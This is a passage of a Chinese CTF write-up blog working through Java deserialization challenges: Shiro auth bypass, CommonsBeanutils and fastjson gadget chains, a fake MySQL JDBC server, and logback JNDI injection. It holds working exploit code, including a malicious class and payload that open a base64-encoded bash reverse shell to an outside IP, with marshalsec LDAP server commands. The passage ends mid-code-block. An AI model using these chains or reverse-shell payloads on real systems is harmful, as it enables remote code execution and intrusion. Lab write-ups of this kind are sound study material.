class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">      securityManager.setRealm(adminRealm);</span><br><span class="line">      <span class="keyword">return</span> securityManager;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> AdminRealm <span class="title function_">adminRealm</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AdminRealm</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化入口需要鉴权</p><p>去搜一下</p><p><a href="https://mvnrepository.com/artifact/org.apache.shiro/shiro-core/1.5.2">https://mvnrepository.com/artifact/org.apache.shiro/shiro-core/1.5.2</a></p><p>存在<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989">CVE-2020-11989</a>分号绕过鉴权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/web;/admin/hello</span><br></pre></td></tr></table></figure><p>这样鉴权就解决了, 再看一下源码中的过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.Util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> blackList.iterator();</span><br><span class="line"></span><br><span class="line">      String s;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         s = (String)var2.next();</span><br><span class="line">      &#125; <span class="keyword">while</span>(!desc.getName().contains(s));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Don&#x27;t hacker!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl</span><br><span class="line">org.hibernate.tuple.component.PojoComponentTuplizer</span><br><span class="line">java.security.SignedObject</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>用来防御<code>Hibernate</code>反序列化链和<code>Jdbc</code>反序列化链</p><p>不过这里Shrio内置了<code>commons-beanutils1.9.4</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240819134609766.png" alt="image-20240819134609766"></p><p>可以直接打CB链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.n4c1.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">poc</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF_DOC\\练习tmp\\[MTCTF2022]easyjava\\easyjava\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;codes&#125;;</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Tools.setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        Tools.setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        Tools.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Tools.serialize2base64(priorityQueue);</span><br><span class="line">        Tools.string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        Tools.InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看题目讨论这题环境有问题, 这里本地过了</p><h2 id="羊城杯-2020-a-piece-of-java"><a href="#羊城杯-2020-a-piece-of-java" class="headerlink" title="[羊城杯 2020]a_piece_of_java"></a>[羊城杯 2020]a_piece_of_java</h2><p>查看源码, <code>MainController</code>中的<code>/hello</code>路由对cookie进行了反序列化</p><p>再看一下这个自定义的反序列化方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(bais, <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        var5.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用了一个SerialKiller来反序列化, 去看一下他使用的serialkiller.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- serialkiller.conf --&gt;</span><br><span class="line">&lt;config&gt;</span><br><span class="line">    &lt;refresh&gt;6000&lt;/refresh&gt;</span><br><span class="line">    &lt;mode&gt;</span><br><span class="line">        &lt;!-- set to &#x27;false&#x27; for blocking mode --&gt;</span><br><span class="line">        &lt;profiling&gt;false&lt;/profiling&gt;</span><br><span class="line">    &lt;/mode&gt;</span><br><span class="line">    &lt;blacklist&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/blacklist&gt;</span><br><span class="line">    &lt;whitelist&gt;</span><br><span class="line">        &lt;regexp&gt;gdufs\..*&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;java\.lang\..*&lt;/regexp&gt;</span><br><span class="line">    &lt;/whitelist&gt;</span><br><span class="line">&lt;/config&gt;</span><br></pre></td></tr></table></figure><p>白名单gdufs和java.lang</p><p>这样一来, 虽然我们在lib目录下看见了<code>Common-collections3.2.1</code>的依赖, 但由于这里的白名单就没办法直接打CC链了(并且SerialKiller自带对cc依赖中恶意类的过滤)</p><p>既然让打gdufs, 那就去gdufs找切入点</p><p>在gdufs.challenge.web.model.DatabaseInfo中发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821233124059.png" alt="image-20240821233124059"></p><p>它实现了Info接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> gdufs.challenge.web.model;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: web-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/gdufs/challenge/web/model/Info.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    Boolean <span class="title function_">checkAllInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getAllInfo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的connect可以打jdbc, 他分别被getConnection和checkAllInfo调用, 那么接下来就是寻找同名方法</p><p>在<code>gdufs.challenge.web.invocation</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// java.lang.reflect.InvocationHandler</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getAllInfo&quot;</span>) &amp;&amp; !<span class="built_in">this</span>.info.checkAllInfo().booleanValue()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.info, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写的invoke方法中调用了checkAllInfo且调用者可控</p><p>这个类继承<code>java.lang.reflect.InvocationHandler</code>, 他是一个动态代理的handler, 我们只需要给<code>DatabaseInfo</code>类套一层动态代理, 反序列化后invoke就会被执行, 进而调用connect, 然后伪造sever打cc链</p><p>注意由于spring boot项目的包结构导致无法直接导入jar包然后<code>import gdufs.challenge.web.model.DatabaseInfo</code>等, 这里我手动创建了需要的类并导入题目jar包的依赖</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822141801157.png" alt="image-20240822141801157"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DatabaseInfo</span> <span class="variable">databaseInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatabaseInfo</span>();</span><br><span class="line">        databaseInfo.setUsername(<span class="string">&quot;yso_CommonsCollections1_calc&quot;</span>);</span><br><span class="line">        databaseInfo.setHost(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">        databaseInfo.setPort(<span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        databaseInfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InfoInvocationHandler</span> <span class="variable">infoInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InfoInvocationHandler</span>(databaseInfo);</span><br><span class="line">        <span class="type">Info</span> <span class="variable">info</span> <span class="operator">=</span> (Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(info);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>伪造mysql服务器</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>这里本地能打通cc, 不i知道为什么弹不了shell</p><p>最后用jdbc文件读取了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">databaseInfo.setPassword(<span class="string">&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360&quot;</span>);</span><br><span class="line">databaseInfo.setUsername(<span class="string">&quot;fileread_/flag&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822153453150.png" alt="image-20240822153453150"></p><h2 id="红明谷CTF-2021-JavaWeb"><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h2><p>提示<code>/login</code>, 访问后返回<code>/json</code>, 不难看出为shiro</p><p><code>/json</code>不能直接访问, 可以用shiro常用的方法绕过鉴权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /;/json HTTP/1.1</span><br></pre></td></tr></table></figure><p>传入json数据可以看见报错, wp说是jackson的报错</p><p>打<code>ch.qos.logback.core.db.JNDIConnectionSource</code> jndi注入</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse_shell_static</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.di.LDAPRefServer http://107.148.75.202:8000/#reverse_shell_static 1389</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/;/json</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1fa50337-4466-472a-83f9-b61579c102f1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>101</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="selector-attr">[<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="string">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://107.148.75.202:1389/Exploit&quot;</span>&#125;]</span></span></span><br></pre></td></tr></table></figure><h2 id="HZNUCTF-2023-easyjava"><a href="#HZNUCTF-2023-easyjava" class="headerlink" title="[HZNUCTF 2023]easyjava"></a>[HZNUCTF 2023]easyjava</h2><p>进去提示 fastjson1.2.48 </p><p>log4j2配合fastjson1.2.48 原生反序列化</p><p>fastjson反序列化poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.ShellCode.getEvilTemplatesImpl;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserial_1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(val);</span><br><span class="line">        string2file(poc, <span class="string">&quot;Unserial_1.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造ldap server</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 